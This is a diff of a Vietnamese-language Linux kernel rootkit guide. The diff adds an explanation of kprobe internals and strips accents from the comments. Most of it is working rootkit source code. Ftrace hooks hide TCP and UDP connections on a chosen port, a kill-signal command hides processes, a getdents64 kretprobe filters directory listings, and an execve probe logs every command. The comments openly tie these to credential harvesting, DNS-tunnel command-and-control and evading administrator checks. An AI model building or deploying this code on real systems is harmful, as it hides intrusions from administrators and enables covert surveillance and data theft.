     /* ──── Command 3: Toggle Process Hiding ────
      *
-     * kill(<PID>, 54) → ẩn/hiện process có PID đó.
+     * kill(<PID>, 54) -> an/hien process co PID do.
      *
-     * Nếu PID đang hidden → show lại.
-     * Nếu PID đang visible → hide.
+     * Neu PID dang hidden -> show lai.
+     * Neu PID dang visible -> hide.
      *
      * is_pid_hidden() / add_hidden_pid() / remove_hidden_pid()
-     * là helper functions quản lý hidden PID list (Chapter 3).
+     * la helper functions quan ly hidden PID list (Chapter 3).
      *
      * Khi PID trong hidden list:
      *   - getdents64 hook filter /proc/<PID> directory entry
-     *   - ps, top, htop không thấy process
-     *   - Process VẪN chạy bình thường (scheduler không dùng /proc)
+     *   - ps, top, htop khong thay process
+     *   - Process VAN chay binh thuong (scheduler khong dung /proc)
      */
     if (is_pid_hidden(target_pid)) {
         remove_hidden_pid(target_pid);
@@ -2496,50 +3494,50 @@ static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
 
 ```c
 /*
- * Hook tcp4_seq_show — ẨN NETWORK CONNECTIONS
+ * Hook tcp4_seq_show — AN NETWORK CONNECTIONS
  *
- * Đây là ưu điểm của ftrace: hook INTERNAL kernel function,
- * không chỉ syscalls. tcp4_seq_show() là function output mỗi dòng
- * trong /proc/net/tcp. Không thể hook function này qua syscall table.
+ * Day la uu diem cua ftrace: hook INTERNAL kernel function,
+ * khong chi syscalls. tcp4_seq_show() la function output moi dong
+ * trong /proc/net/tcp. Khong the hook function nay qua syscall table.
  *
- * /proc/net/tcp là nơi netstat/ss đọc TCP connections.
- * Mỗi dòng = 1 connection. Ẩn dòng = ẩn connection.
+ * /proc/net/tcp la noi netstat/ss doc TCP connections.
+ * Moi dong = 1 connection. An dong = an connection.
  *
  * tcp4_seq_show(struct seq_file *seq, void *v):
  *   seq = output buffer (seq_file framework)
- *   v   = pointer tới current iteration element
- *         v == SEQ_START_TOKEN → header line
- *         v == struct sock *   → connection entry
+ *   v   = pointer toi current iteration element
+ *         v == SEQ_START_TOKEN -> header line
+ *         v == struct sock *   -> connection entry
  *
- * Flow: kernel iterate hash table → gọi tcp4_seq_show cho mỗi sock
- *       → output vào seq_file → user đọc /proc/net/tcp
+ * Flow: kernel iterate hash table -> goi tcp4_seq_show cho moi sock
+ *       -> output vao seq_file -> user doc /proc/net/tcp
  *
- * Hook: nếu sock->sk_num (local port) hoặc sk_dport (remote port)
- *       match HIDDEN_PORT → return 0 (skip, không output dòng này).
+ * Hook: neu sock->sk_num (local port) hoac sk_dport (remote port)
+ *       match HIDDEN_PORT -> return 0 (skip, khong output dong nay).
  */
 static int ft_hooked_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *sk;
 
-    /* Header line (column names) — luôn cho qua */
+    /* Header line (column names) — luon cho qua */
     if (v == SEQ_START_TOKEN)
         return ft_orig_tcp4_seq_show(seq, v);
 
-    /* v là pointer tới struct inet_timewait_sock hoặc struct sock.
-     * Cast an toàn vì tcp4_seq_show code gốc cũng cast tương tự. */
+    /* v la pointer toi struct inet_timewait_sock hoac struct sock.
+     * Cast an toan vi tcp4_seq_show code goc cung cast tuong tu. */
     sk = (struct sock *)v;
 
     /* Check ports.
      * sk_num  = local port (host byte order)
-     * sk_dport = remote port (NETWORK byte order → cần ntohs)
+     * sk_dport = remote port (NETWORK byte order -> can ntohs)
      *
-     * Tại sao khác byte order: sk_num được set bởi bind() đã convert.
-     * sk_dport giữ nguyên từ packet header (network byte order). */
+     * Tai sao khac byte order: sk_num duoc set boi bind() da convert.
+     * sk_dport giu nguyen tu packet header (network byte order). */
     if (sk->sk_num == HIDDEN_PORT ||
         ntohs(sk->sk_dport) == HIDDEN_PORT) {
-        /* Return 0 = "đã xử lý" nhưng không output gì.
-         * seq_file framework thấy return 0 → chuyển sang entry kế.
-         * Dòng output cho connection này bị suppressed. */
+        /* Return 0 = "da xu ly" nhung khong output gi.
+         * seq_file framework thay return 0 -> chuyen sang entry ke.
+         * Dong output cho connection nay bi suppressed. */
         return 0;
     }
 
@@ -2547,59 +3545,59 @@ static int ft_hooked_tcp4_seq_show(struct seq_file *seq, void *v)
 }
 
 /* ──────────────────────────────────────────────────────────────
- * Ẩn UDP connections từ /proc/net/udp
+ * An UDP connections tu /proc/net/udp
  *
- * /proc/net/udp output tương tự /proc/net/tcp:
- *   Mỗi dòng = 1 UDP socket đang listen hoặc active.
- *   Tools: ss -u, netstat -u đọc từ đây.
+ * /proc/net/udp output tuong tu /proc/net/tcp:
+ *   Moi dong = 1 UDP socket dang listen hoac active.
+ *   Tools: ss -u, netstat -u doc tu day.
  *
- * Hook udp4_seq_show() giống tcp4_seq_show():
- *   Nếu port match → return 0 (suppress output).
+ * Hook udp4_seq_show() giong tcp4_seq_show():
+ *   Neu port match -> return 0 (suppress output).
  *
- * Tại sao cần hook UDP riêng:
- *   - TCP và UDP dùng KHÁC seq_operations struct
- *   - tcp4_seq_show ≠ udp4_seq_show
- *   - DNS (53), SNMP (161), syslog (514) dùng UDP
- *   - C2 qua DNS tunneling = UDP traffic cần ẩn
+ * Tai sao can hook UDP rieng:
+ *   - TCP va UDP dung KHAC seq_operations struct
+ *   - tcp4_seq_show != udp4_seq_show
+ *   - DNS (53), SNMP (161), syslog (514) dung UDP
+ *   - C2 qua DNS tunneling = UDP traffic can an
  * ────────────────────────────────────────────────────────────── */
 
 static int ft_hooked_udp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *sk;
 
-    /* SEQ_START_TOKEN = header line. Luôn cho qua.
+    /* SEQ_START_TOKEN = header line. Luon cho qua.
      *
      * Header:
      *   "  sl  local_address rem_address   st tx_queue ..."
-     * Ẩn header = tools parse fail → suspicious. */
+     * An header = tools parse fail -> suspicious. */
     if (v == SEQ_START_TOKEN)
         return ft_orig_udp4_seq_show(seq, v);
 
     sk = (struct sock *)v;
 
-    /* Check source port (local) và destination port.
+    /* Check source port (local) va destination port.
      *
      * UDP socket structure:
-     *   sk->sk_num   = local port mà socket bind()
-     *   sk->sk_dport = remote port (nếu connected UDP)
+     *   sk->sk_num   = local port ma socket bind()
+     *   sk->sk_dport = remote port (neu connected UDP)
      *
-     * UDP thường stateless nên sk_dport có thể = 0
+     * UDP thuong stateless nen sk_dport co the = 0
      * cho unconnected sockets (listen-only).
      *
-     * Check sk_num đủ để ẩn listening UDP sockets. */
+     * Check sk_num du de an listening UDP sockets. */
     if (sk->sk_num == HIDDEN_PORT ||
         ntohs(sk->sk_dport) == HIDDEN_PORT) {
-        return 0;  /* Suppress: dòng này không xuất hiện */
+        return 0;  /* Suppress: dong nay khong xuat hien */
     }
 
     return ft_orig_udp4_seq_show(seq, v);
 }
 
 /* ──────────────────────────────────────────────────────────────
- * Ẩn UDP6 connections (/proc/net/udp6) — IPv6
+ * An UDP6 connections (/proc/net/udp6) — IPv6
  *
- * Nếu server dùng IPv6, cần hook udp6_seq_show() nữa.
- * Logic hoàn toàn giống, chỉ khác tên function.
+ * Neu server dung IPv6, can hook udp6_seq_show() nua.
+ * Logic hoan toan giong, chi khac ten function.
  * ────────────────────────────────────────────────────────────── */
 
 static int ft_hooked_udp6_seq_show(struct seq_file *seq, void *v)
@@ -2618,7 +3616,7 @@ static int ft_hooked_udp6_seq_show(struct seq_file *seq, void *v)
     return ft_orig_udp6_seq_show(seq, v);
 }
 
-/* TCP6 tương tự */
+/* TCP6 tuong tu */
 
 static int ft_hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 {
@@ -2637,10 +3635,10 @@ static int ft_hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 
 ```c
 /* ══════════════════════════════════════════════════════════════
- * HOOK TABLE — Khai báo tất cả hooks
+ * HOOK TABLE — Khai bao tat ca hooks
  *
- * Mỗi entry map: target function name → hook function → original pointer
- * install_ftrace_hook() iterate table này để setup từng hook.
+ * Moi entry map: target function name -> hook function -> original pointer
+ * install_ftrace_hook() iterate table nay de setup tung hook.
  * ══════════════════════════════════════════════════════════════ */
 
 static struct ftrace_hook ft_hooks[] = {
@@ -2668,7 +3666,7 @@ int rk_ftrace_install(void)
     for (i = 0; i < ARRAY_SIZE(ft_hooks); i++) {
         err = install_ftrace_hook(&ft_hooks[i]);
         if (err) {
-            /* Rollback: remove hooks đã install */
+            /* Rollback: remove hooks da install */
             while (--i >= 0)
                 remove_ftrace_hook(&ft_hooks[i]);
             return err;
@@ -2690,47 +3688,312 @@ void rk_ftrace_remove(void)
 
 ## Chapter 5: Kprobe/Kretprobe Hooking
 
+### 5.0 Kprobe/Kretprobe Mechanism — Hardware breakpoint hooking
+
+Kprobes (Kernel Probes) la debug framework cho phep chen "probe" tai bat ky instruction nao trong kernel. Rootkit su dung kprobes de hook functions voi API chinh thuc cua kernel. Phan nay giai thich co che noi bo cua kprobes tai muc CPU instruction.
+
+#### Kprobe: Software breakpoint voi INT3
+
+Kprobe hoat dong bang cach thay the instruction tai probe point bang INT3 (opcode 0xCC — software breakpoint):
+
+```
+TRUOC khi register kprobe:
+                                    
+  target_function:                  
+  +0:  55                push rbp          <- instruction goc (1 byte)
+  +1:  48 89 e5          mov rbp, rsp
+  +4:  48 83 ec 20       sub rsp, 0x20
+  ...
+
+SAU khi register kprobe (probe tai +0):
+  
+  target_function:
+  +0:  CC                INT3              <- DA THAY bang breakpoint!
+  +1:  48 89 e5          mov rbp, rsp      (byte +1 tro di khong doi)
+  +4:  48 83 ec 20       sub rsp, 0x20
+  ...
+  
+  Kernel luu instruction goc (0x55 = push rbp) trong kprobe struct.
+
+Multi-byte instruction example:
+  Neu instruction goc la "0F 84 xx xx" (JE rel32, 6 bytes):
+  
+  Truoc: 0F 84 xx xx xx xx   JE target
+  Sau:   CC 84 xx xx xx xx   INT3 + garbage
+  
+  Chi byte dau bi thay. Cac byte con lai van o do nhung khong
+  duoc execute vi INT3 trap truoc khi CPU doc chung.
+  (Exception: neu CPU co instruction prefetch > 1 byte, nhung
+  INT3 la special case — CPU handle dung.)
+```
+
+#### Kprobe execution flow — Khi CPU hit breakpoint
+
+```
+1. CPU execute instruction tai target_function+0
+   -> Thay 0xCC (INT3)
+   -> CPU raise #BP exception (Breakpoint, vector 3)
+   -> CPU push trap frame lên stack, switch to kernel trap handler
+
+2. do_int3() (arch/x86/kernel/traps.c)
+   -> Check: co kprobe registered tai address nay khong?
+   -> Tim kprobe_table[hash(address)]
+   -> Neu tim thay: goi kprobe_handler()
+
+3. kprobe_handler() (kernel/kprobes.c)
+   |
+   +-> Goi p->pre_handler(p, regs)
+   |   (day la callback cua ban — noi ban log, modify, v.v.)
+   |   regs = pt_regs* tai thoi diem trap
+   |   regs->ip = address cua INT3 = function entry
+   |
+   +-> Setup single-step:
+   |   - Copy instruction goc vao slot dac biet (kprobe_insn_slot)
+   |   - Set TF (Trap Flag) trong RFLAGS
+   |   - Set regs->ip = address cua slot (de execute instruction goc)
+   |
+   +-> Return tu exception handler
+       -> CPU execute instruction goc (tai slot, khong phai original location)
+       -> Vi TF = 1, sau instruction goc, CPU raise #DB (Debug exception)
+
+4. do_debug() -> kprobe_debug_handler()
+   |
+   +-> Goi p->post_handler(p, regs, 0)
+   |   (callback SAU instruction goc da execute)
+   |
+   +-> Clear TF
+   +-> Set regs->ip = original address + instruction length
+       (de CPU tiep tuc tai instruction KE TIEP trong function goc)
+   +-> Return tu exception handler
+       -> CPU tiep tuc execute function binh thuong
+
+Timeline:
+  ... -> hit INT3 -> #BP -> pre_handler -> single-step original
+      -> #DB -> post_handler -> continue function normally -> ...
+```
+
+#### Kretprobe: Return address hijacking
+
+Kretprobe la extension cua kprobe, cho phep hook tai RETURN POINT cua function. Co che hoat dong bang cach thay doi return address tren stack:
+
+```
+Kretprobe registration:
+  Kernel dat mot kprobe tai function ENTRY (khong phai return).
+  Kprobe nay co pre_handler dac biet: pre_handler_kretprobe().
+
+Khi function duoc goi (step by step):
+
+1. CALLER goi target_function:
+   call target_function
+   -> CPU push return address len stack:
+      [RSP] = address trong CALLER (noi se quay ve)
+
+2. Function entry -> hit kprobe (INT3) -> pre_handler_kretprobe():
+   
+   a) Allocate kretprobe_instance (ri) tu freelist:
+      ri->ret_addr = [RSP]      // Save return address THAT
+      ri->task = current         // Save owning task
+      ri->data = scratch space   // data_size bytes cho user data
+   
+   b) THAY return address tren stack:
+      [RSP] = &kretprobe_trampoline  // Thay bang trampoline address!
+   
+   c) Goi entry_handler(ri, regs) neu co:
+      (day la noi ban save arguments tu registers)
+
+   Stack SAU buoc nay:
+   +------------------+
+   | kretprobe_tramp  |  <- [RSP] = FAKE return address
+   +------------------+
+   | saved rbp        |
+   +------------------+
+   | local variables  |
+   +------------------+
+
+3. Function execute binh thuong...
+   (khong biet return address da bi thay doi)
+
+4. Function execute RET instruction:
+   -> CPU pop [RSP] vao RIP
+   -> RIP = kretprobe_trampoline (KHONG PHAI caller that!)
+   -> CPU nhay toi trampoline
+
+5. kretprobe_trampoline (arch/x86/kernel/kprobes/core.c):
+   
+   a) Tim kretprobe_instance cho (current task, function nay):
+      -> ri = instance da luu o buoc 2
+   
+   b) Goi ri->rp->handler(ri, regs):
+      -> Day la return handler cua ban
+      -> regs->ax = return value cua function
+      -> Ban co the MODIFY regs->ax de thay doi return value!
+      -> ri->data chua data ban luu tu entry_handler
+   
+   c) Restore return address that:
+      regs->ip = ri->ret_addr  // Quay ve caller THAT
+   
+   d) Return ri vao freelist:
+      (ready cho lan goi ke tiep)
+   
+   e) Return tu trampoline:
+      -> CPU jump toi ri->ret_addr = caller that
+      -> Caller thay return value (co the da bi modify!)
+
+Timeline:
+  CALLER -> call func -> [kprobe: save ret_addr, replace with trampoline,
+                          call entry_handler]
+         -> func executes normally...
+         -> func returns (RET) -> lands in trampoline
+         -> [call return handler, restore real ret_addr]
+         -> back to CALLER (transparent)
+```
+
+#### Per-instance data va freelist
+
+```
+Moi concurrent invocation cua hooked function can mot 
+kretprobe_instance rieng (vi moi invocation co return address
+va saved data khac nhau):
+
+struct kretprobe_instance:
++-----------------------------------------------------------+
+| struct hlist_node hlist   | Linked list node               |
++-----------------------------------------------------------+
+| struct kretprobe *rp      | Pointer ve kretprobe struct     |
++-----------------------------------------------------------+
+| kprobe_opcode_t *ret_addr | Return address THAT (saved)     |
++-----------------------------------------------------------+
+| struct task_struct *task  | Task owning this instance       |
++-----------------------------------------------------------+
+| char data[]               | User scratch space              |
+|   (size = rp->data_size)  | Ban dung de luu arguments tu    |
+|                           | entry_handler, doc lai trong    |
+|                           | return handler.                 |
++-----------------------------------------------------------+
+
+Freelist management:
+  kretprobe.maxactive = so instance toi da dong thoi.
+  
+  Khi register:
+    Kernel pre-allocate maxactive instances vao freelist.
+    
+  Khi function entry:
+    Pop instance tu freelist. Neu freelist empty (>maxactive 
+    concurrent calls) -> MISS hook cho invocation nay.
+    nmissed counter tang.
+    
+  Khi function return:
+    Push instance tro lai freelist.
+
+  Chon maxactive:
+    Qua nho: miss hooks tren busy systems
+    Qua lon: waste memory (moi instance ~ 64-256 bytes)
+    Typical: 20-50 cho server, 5-10 cho desktop
+```
+
+#### Kprobe optimization
+
+Sau khi probe duoc register va stable (khong bi unregister ngay), kernel co the optimize:
+
+```
+Unoptimized (default):
+  INT3 -> #BP exception -> kprobe_handler -> single-step -> #DB -> post_handler
+  Overhead: ~1-2 microseconds (2 exceptions)
+
+Optimized (CONFIG_OPTPROBES=y):
+  Kernel thay INT3 bang JMP toi optimized handler:
+  
+  Truoc optimization:  CC xx xx xx xx        INT3 + leftover bytes
+  Sau optimization:    E9 xx xx xx xx        JMP rel32 (to handler)
+  
+  Handler la generated code (allocated dynamically):
+    - Save registers
+    - Goi pre_handler
+    - Execute original instruction (no exception needed)
+    - Goi post_handler
+    - JMP back to next instruction
+    
+  Overhead: ~100-500 nanoseconds (no exceptions, just jumps)
+
+Khong phai moi probe duoc optimize:
+  - Instruction phai >= 5 bytes (de vua JMP rel32)
+  - Khong duoc la jump target tu noi khac
+  - Khong duoc nam trong blacklisted function
+  
+Rootkit implication:
+  Optimized probes kho detect hon (khong co INT3 signature).
+  Nhung JMP instruction van la modification detectable boi
+  code integrity checking.
+```
+
+#### Blacklisted functions
+
+Mot so kernel functions KHONG THE bi probe vi se gay recursion hoac crash:
+
+```
+Blacklisted (khong the kprobe):
+  - kprobe_handler() va cac helper (recursion)
+  - do_int3(), do_debug() (exception handlers cho kprobe)
+  - NMI handlers (non-maskable interrupt — khong the disable)
+  - Ftrace internal functions
+  - Functions trong .kprobes.text section
+  - Functions marked __kprobes hoac NOKPROBE_SYMBOL()
+
+Danh sach tai: /sys/kernel/debug/kprobes/blacklist
+
+Rootkit implication:
+  Neu target function bi blacklisted, phai dung phuong phap khac
+  (ftrace, inline hook, hoac hook function caller thay vi callee).
+  
+Detection:
+  /sys/kernel/debug/kprobes/list — liet ke TAT CA active kprobes
+  Admin doc file nay = thay ngay rootkit hooks.
+  Rootkit nang cao: hook viec DOC file nay (meta-hook).
+```
+
+---
+
 ```c
 /* kprobe_hooks.c — Kprobe-based hooking
  *
- * Kprobes = Kernel Probes. Debug framework cho phép chèn
- * breakpoint tại bất kỳ instruction nào trong kernel.
+ * Kprobes = Kernel Probes. Debug framework cho phep chen
+ * breakpoint tai bat ky instruction nao trong kernel.
  *
- * SO SÁNH VỚI FTRACE:
- *   Kprobe:  hook tại BẤT KỲ instruction, không chỉ function entry
- *            → flexible hơn (hook giữa function, hook specific instructions)
- *   Ftrace:  chỉ hook tại function entry (__fentry__)
- *            → cleaner API, ít overhead
+ * SO SANH VOI FTRACE:
+ *   Kprobe:  hook tai BAT KY instruction, khong chi function entry
+ *            -> flexible hon (hook giua function, hook specific instructions)
+ *   Ftrace:  chi hook tai function entry (__fentry__)
+ *            -> cleaner API, it overhead
  *
  * Kprobe types:
- *   1. kprobe:     trigger tại INSTRUCTION — chạy handler TRƯỚC instruction
- *   2. kretprobe:  trigger tại FUNCTION RETURN — chạy handler TRƯỚC return
+ *   1. kprobe:     trigger tai INSTRUCTION — chay handler TRUOC instruction
+ *   2. kretprobe:  trigger tai FUNCTION RETURN — chay handler TRUOC return
  *   3. jprobe:     deprecated (removed trong kernel 4.15)
  *
- * Kretprobe đặc biệt hữu ích cho rootkit:
- *   → hook function return → modify RETURN VALUE
- *   → Ví dụ: sys_getdents64 return count → giảm count = ẩn entries
+ * Kretprobe dac biet huu ich cho rootkit:
+ *   -> hook function return -> modify RETURN VALUE
+ *   -> Vi du: sys_getdents64 return count -> giam count = an entries
  *
- * CÁCH KPROBE HOẠT ĐỘNG (internal):
+ * CACH KPROBE HOAT DONG (internal):
  *
- *   1. Kernel save instruction gốc tại probe point
- *   2. Replace bằng INT3 (0xCC) — breakpoint instruction
- *   3. Khi CPU hit INT3 → trap handler chạy
- *   4. Trap handler gọi registered kprobe handlers
+ *   1. Kernel save instruction goc tai probe point
+ *   2. Replace bang INT3 (0xCC) — breakpoint instruction
+ *   3. Khi CPU hit INT3 -> trap handler chay
+ *   4. Trap handler goi registered kprobe handlers
  *   5. Execute original instruction (single-step)
  *   6. Continue execution
  *
  *   Kretprobe additionally:
- *   1. Replace return address trên stack bằng trampoline
- *   2. Khi function return → jump tới trampoline
- *   3. Trampoline gọi kretprobe handler
- *   4. Handler có thể modify return value (regs->ax)
- *   5. Jump tới original return address
+ *   1. Replace return address tren stack bang trampoline
+ *   2. Khi function return -> jump toi trampoline
+ *   3. Trampoline goi kretprobe handler
+ *   4. Handler co the modify return value (regs->ax)
+ *   5. Jump toi original return address
  *
  * Detection:
- *   /sys/kernel/debug/kprobes/list — liệt kê mọi active kprobes
- *   → Admin check file này = thấy rootkit hooks
- *   → Rootkit nâng cao: hook việc ĐỌC file này :)
+ *   /sys/kernel/debug/kprobes/list — liet ke moi active kprobes
+ *   -> Admin check file nay = thay rootkit hooks
+ *   -> Rootkit nang cao: hook viec DOC file nay :)
  */
 
 #include "rootkit.h"
@@ -2738,26 +4001,26 @@ void rk_ftrace_remove(void)
 /* ══════════════════════════════════════════════════════════════
  * KRETPROBE: Hook sys_getdents64 RETURN
  *
- * Kretprobe hook tại RETURN POINT. Khi sys_getdents64() chuẩn bị
- * return, handler chạy → có thể modify return value và data.
+ * Kretprobe hook tai RETURN POINT. Khi sys_getdents64() chuan bi
+ * return, handler chay -> co the modify return value va data.
  *
- * Ưu điểm so với pre-hook:
- *   - Data đã trong userspace buffer → modify trước khi user thấy
- *   - Return value (count) có thể giảm → phản ánh filtered data
- *   - Không cần biết function internals, chỉ cần biết output
+ * Uu diem so voi pre-hook:
+ *   - Data da trong userspace buffer -> modify truoc khi user thay
+ *   - Return value (count) co the giam -> phan anh filtered data
+ *   - Khong can biet function internals, chi can biet output
  *
- * Vấn đề:
- *   - Kretprobe có giới hạn maxactive (concurrent instances)
- *   - Nếu vượt maxactive → handler bị miss cho một số calls
- *   - Set maxactive cao = dùng nhiều memory
+ * Van de:
+ *   - Kretprobe co gioi han maxactive (concurrent instances)
+ *   - Neu vuot maxactive -> handler bi miss cho mot so calls
+ *   - Set maxactive cao = dung nhieu memory
  * ══════════════════════════════════════════════════════════════ */
 
-/* Instance data — lưu thông tin giữa entry và return.
+/* Instance data — luu thong tin giua entry va return.
  *
- * Khi function entry: save arguments (vì registers sẽ bị overwrite)
- * Khi function return: dùng saved arguments để xử lý
+ * Khi function entry: save arguments (vi registers se bi overwrite)
+ * Khi function return: dung saved arguments de xu ly
  *
- * Mỗi concurrent call có instance data riêng (per-invocation storage).
+ * Moi concurrent call co instance data rieng (per-invocation storage).
  */
 struct getdents64_data {
     struct linux_dirent64 __user *dirent;  /* Saved userspace buffer pointer */
@@ -2765,14 +4028,14 @@ struct getdents64_data {
 };
 
 /*
- * Entry handler — chạy khi sys_getdents64 BẮT ĐẦU execute.
+ * Entry handler — chay khi sys_getdents64 BAT DAU execute.
  *
- * Mục đích: save arguments trước khi bị overwrite bởi function body.
- * Trong kretprobe, handler chỉ chạy lúc RETURN — lúc đó registers
- * đã thay đổi, không còn arguments. Nên phải save ở entry.
+ * Muc dich: save arguments truoc khi bi overwrite boi function body.
+ * Trong kretprobe, handler chi chay luc RETURN — luc do registers
+ * da thay doi, khong con arguments. Nen phai save o entry.
  *
- * ri->data: pointer tới instance storage (struct getdents64_data)
- *           Mỗi concurrent invocation có data riêng.
+ * ri->data: pointer toi instance storage (struct getdents64_data)
+ *           Moi concurrent invocation co data rieng.
  */
 static int getdents64_entry(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
@@ -2780,10 +4043,10 @@ static int getdents64_entry(struct kretprobe_instance *ri,
     struct getdents64_data *data =
         (struct getdents64_data *)ri->data;
 
-    /* Save arguments từ registers.
+    /* Save arguments tu registers.
      * regs->di = arg1 (fd)
      * regs->si = arg2 (dirent buffer pointer)
-     * Cần save vì lúc return, di/si đã bị overwrite. */
+     * Can save vi luc return, di/si da bi overwrite. */
     data->fd     = (int)regs->di;
     data->dirent = (struct linux_dirent64 __user *)regs->si;
 
@@ -2791,13 +4054,13 @@ static int getdents64_entry(struct kretprobe_instance *ri,
 }
 
 /*
- * Return handler — chạy khi sys_getdents64 CHUẨN BỊ return.
+ * Return handler — chay khi sys_getdents64 CHUAN BI return.
  *
- * Tại thời điểm này:
- *   - Function đã execute xong
+ * Tai thoi diem nay:
+ *   - Function da execute xong
  *   - Return value = regs->ax (total bytes of dirent data)
- *   - Userspace buffer đã được fill bởi kernel
- *   - Ta có thể modify buffer VÀ return value
+ *   - Userspace buffer da duoc fill boi kernel
+ *   - Ta co the modify buffer VA return value
  */
 static int getdents64_return(struct kretprobe_instance *ri,
                               struct pt_regs *regs)
@@ -2814,9 +4077,9 @@ static int getdents64_return(struct kretprobe_instance *ri,
         return 0;
 
     kern_buf = kzalloc(ret, GFP_ATOMIC);
-    /* GFP_ATOMIC: kretprobe handler CÓ THỂ chạy trong atomic context
-     * (nơi không thể sleep). GFP_KERNEL sẽ crash nếu need to sleep.
-     * GFP_ATOMIC có thể fail nếu hết memory → check NULL. */
+    /* GFP_ATOMIC: kretprobe handler CO THE chay trong atomic context
+     * (noi khong the sleep). GFP_KERNEL se crash neu need to sleep.
+     * GFP_ATOMIC co the fail neu het memory -> check NULL. */
     if (!kern_buf)
         return 0;
 
@@ -2825,16 +4088,16 @@ static int getdents64_return(struct kretprobe_instance *ri,
         return 0;
     }
 
-    /* Filtering logic — giống hooked_getdents64 trong Chapter 3.
-     * Lặp lại ở đây cho completeness. */
+    /* Filtering logic — giong hooked_getdents64 trong Chapter 3.
+     * Lap lai o day cho completeness. */
     offset = 0;
     prev_entry = NULL;
     while (offset < ret) {
         current_entry = (void *)kern_buf + offset;
 
         /* Validate d_reclen — protect against corrupted entries.
-         * d_reclen == 0 → offset không advance → infinite loop.
-         * d_reclen > remaining → overread past buffer boundary. */
+         * d_reclen == 0 -> offset khong advance -> infinite loop.
+         * d_reclen > remaining -> overread past buffer boundary. */
         if (current_entry->d_reclen == 0)
             break;
         if (current_entry->d_reclen > (ret - offset))
@@ -2866,9 +4129,9 @@ static int getdents64_return(struct kretprobe_instance *ri,
 
     /* MODIFY RETURN VALUE.
      * 
-     * regs->ax = return value trên x86-64.
-     * Set = filtered size. Nếu không modify, userspace thấy
-     * original count nhưng buffer đã bị truncate → confusion. */
+     * regs->ax = return value tren x86-64.
+     * Set = filtered size. Neu khong modify, userspace thay
+     * original count nhung buffer da bi truncate -> confusion. */
     regs->ax = ret;
 
     return 0;
@@ -2881,27 +4144,27 @@ static struct kretprobe getdents64_probe = {
 
     /* maxactive: maximum concurrent invocations.
      *
-     * Nếu 20 processes đồng thời gọi getdents64,
-     * probe xử lý 20 cái cùng lúc. Nếu >20, cái thừa bị miss.
+     * Neu 20 processes dong thoi goi getdents64,
+     * probe xu ly 20 cai cung luc. Neu >20, cai thua bi miss.
      *
-     * Chọn giá trị:
-     *   - Quá nhỏ: miss hooks trên busy systems
-     *   - Quá lớn: waste memory (mỗi instance = sizeof(data) bytes)
-     *   - 20-50 thường đủ cho server workloads */
+     * Chon gia tri:
+     *   - Qua nho: miss hooks tren busy systems
+     *   - Qua lon: waste memory (moi instance = sizeof(data) bytes)
+     *   - 20-50 thuong du cho server workloads */
     .maxactive       = 20,
 
     .kp.symbol_name  = SYSCALL_PREFIX "getdents64",
 };
 
 /* ══════════════════════════════════════════════════════════════
- * KPROBE: Hook sys_execve — Log mọi process execution
+ * KPROBE: Hook sys_execve — Log moi process execution
  *
- * Pre-handler: chạy TRƯỚC instruction tại probe point.
+ * Pre-handler: chay TRUOC instruction tai probe point.
  *
- * Use case: monitoring (log mọi exec) hoặc filtering
+ * Use case: monitoring (log moi exec) hoac filtering
  * (block specific binaries).
  *
- * APT use case: log mọi command người dùng chạy → credential
+ * APT use case: log moi command nguoi dung chay -> credential
  * harvesting, lateral movement intelligence.
  * ══════════════════════════════════════════════════════════════ */
 
@@ -2910,16 +4173,16 @@ static int execve_pre_handler(struct kprobe *p, struct pt_regs *regs)
     char __user *user_filename = (char __user *)regs->di;
     char filename[256];
 
-    /* strncpy_from_user(): copy string từ userspace.
-     * Return: số bytes copied, hoặc negative error.
-     * An toàn hơn copy_from_user vì handle null-termination. */
+    /* strncpy_from_user(): copy string tu userspace.
+     * Return: so bytes copied, hoac negative error.
+     * An toan hon copy_from_user vi handle null-termination. */
     long len = strncpy_from_user(filename, user_filename,
                                   sizeof(filename) - 1);
     if (len > 0) {
         filename[len] = '\0';
 
-        /* Log execution. Trong rootkit thật, gửi qua covert channel
-         * thay vì printk (vì printk visible trong dmesg). */
+        /* Log execution. Trong rootkit that, gui qua covert channel
+         * thay vi printk (vi printk visible trong dmesg). */
         pr_info("rk: exec: %s by %s[%d] uid=%d\n",
                 filename,
                 current->comm,          /* Process name */
@@ -2927,9 +4190,9 @@ static int execve_pre_handler(struct kprobe *p, struct pt_regs *regs)
                 current_uid().val);     /* User ID */
 
         /* Advanced: filter execution.
-         * Return non-zero từ pre_handler KHÔNG block execution.
-         * Để block: phải modify regs (set return address, etc.)
-         * Hoặc dùng kretprobe + modify return value = -EPERM. */
+         * Return non-zero tu pre_handler KHONG block execution.
+         * De block: phai modify regs (set return address, etc.)
+         * Hoac dung kretprobe + modify return value = -EPERM. */
     }
 
     return 0;
@@ -2943,12 +4206,12 @@ static struct kprobe execve_kp = {
 /* ══════════════════════════════════════════════════════════════
  * KRETPROBE: Hook tcp_connect — Monitor/hide outbound connections
  *
- * Hook tcp_v4_connect() thay vì sys_connect() — sâu hơn,
- * bypass userland tools mà chỉ trace syscalls.
+ * Hook tcp_v4_connect() thay vi sys_connect() — sau hon,
+ * bypass userland tools ma chi trace syscalls.
  *
- * tcp_v4_connect() là internal function handle TCP connection setup.
- * Hooked tại đây nghĩa là ta thấy connection TRƯỚC khi bất kỳ
- * userland monitoring tool nào.
+ * tcp_v4_connect() la internal function handle TCP connection setup.
+ * Hooked tai day nghia la ta thay connection TRUOC khi bat ky
+ * userland monitoring tool nao.
  * ══════════════════════════════════════════════════════════════ */
 
 struct tcp_connect_data {
@@ -2981,7 +4244,7 @@ static int tcp_connect_return(struct kretprobe_instance *ri,
         unsigned short dport = ntohs(sk->sk_dport); /* Dest port */
         unsigned short sport = sk->sk_num;      /* Source port */
 
-        pr_info("rk: TCP connect %pI4:%u → %pI4:%u\n",
+        pr_info("rk: TCP connect %pI4:%u -> %pI4:%u\n",
                 &sk->sk_rcv_saddr, sport,    /* %pI4 = print IPv4 */
                 &daddr, dport);
     }
@@ -3036,8 +4299,8 @@ void rk_kprobe_remove(void)
     unregister_kprobe(&execve_kp);
     unregister_kretprobe(&getdents64_probe);
 
-    /* Sau unregister, đợi in-flight handlers hoàn thành.
-     * synchronize_rcu() đảm bảo mọi CPU đã exit handler. */
+    /* Sau unregister, doi in-flight handlers hoan thanh.
